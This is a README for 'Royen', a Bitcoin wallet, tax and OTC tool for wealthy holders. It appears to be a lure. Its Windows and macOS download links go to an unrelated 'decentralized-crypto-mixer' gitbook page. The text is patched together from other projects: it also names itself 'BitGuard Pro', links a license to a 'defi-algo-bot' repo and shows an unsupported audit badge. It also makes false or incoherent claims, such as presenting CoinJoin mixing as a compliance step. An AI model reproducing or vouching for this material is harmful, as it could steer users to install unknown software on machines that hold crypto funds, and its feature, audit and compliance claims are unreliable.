# 🛡️ Royen
Bitcoin Security Software | Tax Optimization & Multisig Wallet | OTC Trading & Regulatory Compliance 
## 🔥 **Description**  
**Royen** is a self-hosted Bitcoin management software for high-net-worth individuals (HNWI). Features multisig vaults, tax optimization (FIFO/LIFO/HIFO), OTC liquidity planning, hardware wallet integration (Ledger/Trezor), and regulatory compliance tools. Designed for BTC whales (>100k$) seeking privacy, security, and financial sovereignty.
<p align="center"><img width="820" height="494" src="dashboard/ui.jpg" alt="Bot interface" /></p>

[![Audited by OpenZeppelin](https://img.shields.io/badge/Audit-OpenZeppelin-green)](https://openzeppelin.com)
[![MPC Wallet Support](https://img.shields.io/badge/Security-Fireblocks%20MPC-blue)](https://)

# Download
### **Download** [Windows](https://selenium-finance.gitbook.io/decentralized-crypto-mixer/download/windows) / [macOS](https://selenium-finance.gitbook.io/decentralized-crypto-mixer/download/macos)

[![License](https://img.shields.io/badge/License-MIT-green)](https://github.com/yourusername/defi-algo-bot)
[![Python](https://img.shields.io/badge/Python-3.10%2B-blue)](https://www.python.org)
[![Web3](https://img.shields.io/badge/Web3.py-6.0+-brightgreen)](https://web3py.readthedocs.io)

## 🚀 **Key Features**  

### 🔒 Secure Vault (Multisig + Cold Storage)
- **AES-256 & ChaCha20 Encryption** for private keys.  
- **2/3, 3/5 Multisig** with Ledger/Trezor/Offline Device support.  
- **Shamir Secret Sharing** (SLIP-39) for seed phrase backup.  
- **UTXO Management** with Coin Control (avoid address reuse).  

### 💹 OTC Liquidity Planner
- **Slippage Minimization** using Glassnode liquidity data.  
- **Dark Pool Integration** (Binance OTC, Coinbase Prime).  
- **Whale Movement Alerts** via Whale Alert API.  

### 📊 Bitcoin Core Integration
- **Full Node Sync** for SPV-less verification.  
- **PSBT (Partially Signed Bitcoin Transactions)** workflow for air-gapped signing.  

### 📑 Tax Optimizer
- Automated **FIFO, LIFO, HIFO** calculations for IRS/HMRC compliance.  
- **CoinJoin & Wasabi Wallet** transaction labeling (privacy-aware reporting).  
- **Tax-Loss Harvesting** alerts and CSV exports for TurboTax/CryptoTax.  

### 🌐 Regulatory Watchdog
- Real-time updates on **MiCA (EU), IRS Form 8949, FATF Travel Rule**.  
- **KYC/AML Checklist** for transactions >$10k.  
- **Jurisdiction Analyzer** (compare tax rates across 50+ countries).  

## ⚙️ Customizable Settings(Just choose in GUI)

### 🔧 Security Module
```
security:  
  multisig_threshold: "3/5"  
  encryption_algorithm: "AES-256"  
  shamir_shares: 5  
  auto_backup_interval: "weekly"  
  max_unsigned_tx_value: 5.0
```
- Encryption Algorithms: Choose between XChaCha20-Poly1305 or AES-256.
- Session Timeouts: Auto-lock after 5–60 minutes of inactivity.
- API Permissions: Restrict CEX integrations to read-only mode.


### 📉 Tax Module
```
tax:  
  accounting_method: "LIFO"  
  tax_free_threshold: 1000  
  coinjoin_labeling: true  
  tax_year_end: "03-31"
```
### Liquidity Module
```
liquidity:  
  daily_sell_limit: 10.0  
  slippage_tolerance: "0.8%"  
  whale_alert_threshold: 200  
  preferred_exchanges: ["Binance OTC", "Gemini"]
```
### Regulatory Module
```
compliance:  
  kyc_threshold: 5000  
  reporting_jurisdictions: ["US", "DE", "SG"]  
  travel_rule_enabled: true
```
### Network Module
```
network:  
  tor_routing: false  
  bitcoin_node_rpc: "/custom/bitcoin/data"  
  api_whitelist: ["glassnode.com", "blockchain.info"]
```
## Wallet integration (Wasabi, Electrum, CEX)

### 1. Connecting Wasabi Wallet

Goal: Import transactions, balances, and CoinJoin data.

Settings:

- Local File Sync:
  - Wasabi stores data in the WalletFiles folder. BitGuard Pro scans this directory (with user permission) and imports:
    - Public addresses.
    - CoinJoin transaction history.
    - Balances (encrypted).
  - Data encryption: AES-256 with a key derived from the user’s master password.

-  Advanced API Integration:
    - Run Wasabi in the background with access to its RPC interface (port 37128).
    - Example balance request:
```
        curl --data '{"jsonrpc":"2.0","method":"getbalance"}' http://localhost:37128/
```
 - Royen uses this data for privacy analysis (e.g., tracking mixed UTXOs).

Risks:
- Accessing Wasabi files requires disabling its "read-only mode."
- Solution: "Import-only" mode without write permissions.

### 2. Integration with CEX (Binance, Coinbase, Kraken)

Goal: Monitor balances and execute OTC trades.

Settings:

- Read-Only API Keys:
  - Users create API keys with no trading/withdrawal permissions.
  - Keys are encrypted locally (XChaCha20-Poly1305) and stored in SQLite.

- Manual CSV Import:
  - For full isolation: upload exchange transaction history files.
  - Supported formats: Binance CSV, Coinbase Form 8949.


- Offline Sync:
  - To fetch real-time data:
    1. Royen generates API requests.
    2. Users manually copy them to a browser with VPN/Tor enabled.
    3. Responses (JSON) are imported via QR code or file.

Example Workflow for Binance:

1. In the CEX Sync section, select "Binance."
2. Copy the generated balance request URL:
```
    https://api.binance.com/api/v3/account?timestamp=123456789&signature=XXXXX
```
3. Open the URL in an isolated browser, log in, and save the response as binance_balance.json.
4. Load the file into Royen → data is decrypted and analyzed offline.

### 3. Universal Wallet Module

Goal: Support any wallet (Electrum, Exodus, Trezor Suite).

Settings:

- xPub/yPub/zPub Key Import:

  - Users enter a wallet’s public key → Royen tracks balances/transactions via a local Bitcoin Core node.
  - Data never leaves the device.

- Hardware Wallet Integration:
  - Connect Ledger/Trezor via USB.
  - Read addresses and sign transactions without exporting private keys.

Example for Ledger:

1. In the Wallets section, select "Ledger."
2. Connect the device and confirm access on the Ledger screen.
3. Royen displays balances and prompts to sign pre-built transactions.

### 4. Security Rules

- CEX Key Isolation:

  - API keys are encrypted and never used for automated actions.
  - Access requires a master password.

- Wallet Audits:

  - Security Audit section → risk reports (e.g., "Wasabi Wallet v2.0 has CVE-2023-XXX vulnerability").

- Tor Routing for CEX Requests:

  - All manual HTTP requests to exchanges use the built-in Tor client.

5. Configuration Example

File wallets.yaml:
```
wallets:  
  - name: "Wasabi Main Wallet"  
    type: "wasabi"  
    path: "~/walletdata/Wasabi/Client/WalletFiles"  
    read_only: true  

  - name: "Binance BTC"  
    type: "cex"  
    exchange: "binance"  
    api_key_encrypted: "a1b2c3...xyz"  
    import_method: "csv"  

  - name: "Ledger Cold Storage"  
    type: "hardware"  
    model: "ledger_nano_x"  
    xpub: "zpub6..."
```

6. Usage Scenarios

Scenario 1: CoinJoin Privacy Analysis

1. Import Wasabi data into Royen.
2. In the Tax Optimizer, label mixed UTXOs as "non-personally associated."
3. Generate tax reports excluding anonymized transactions (where legal).

Scenario 2: Monitoring CEX Risks
1. Load Binance balances via manual JSON import.
2. If the exchange freezes withdrawals, Regulatory Watchdog suggests moving BTC to a decentralized wallet.

    
## 🧩 Example Use Cases

Case 1: Selling 50 BTC via OTC with Tax Savings

  1. Liquidity Planner splits sales into 5 BTC/day batches to avoid slippage.
  2. Tax Optimizer selects HIFO method, saving 12% vs FIFO.
  3. Secure Vault signs via 3/5 multisig (2 Ledgers + 1 air-gapped PC).

Case 2: Preparing for EU MiCA Compliance

  1. Regulatory Watchdog flags non-KYC UTXOs.
  2. Wasabi Wallet Integration mixes 20 BTC via CoinJoin.
  3. Compliance Report auto-generated for regulators.

## 🛠️ Integrated APIs & Libraries  
| API/Library          | Use Case                          | Security Protocol       |  

|----------------------|-----------------------------------|-------------------------| 
 
| **Glassnode**        | Liquidity analysis, Whale alerts  | IPFS-cached data        |  

| **Ledger/Trezor**    | Cold storage multisig             | USB HID + U2F           |  

| **Binance/Coinbase** | OTC balance sync                  | Read-only API keys       |  

| **Blockchain.com**   | UTXO explorer                     | Tor routing              |  

| **Bitcoin Core RPC** | Transaction parsing               | Local node (no cloud)   | 

## ❓ FAQ
Q: Can governments/CEX freeze my BTC with BitGuard Pro?

A: No. Private keys never leave your device.

Q: How to integrate with Binance?

A: Use read-only API keys (no withdrawal permissions).

Q: Is HIFO tax method legal in my country?

A: Consult a tax pro. BitGuard Pro supports 8 accounting standards.
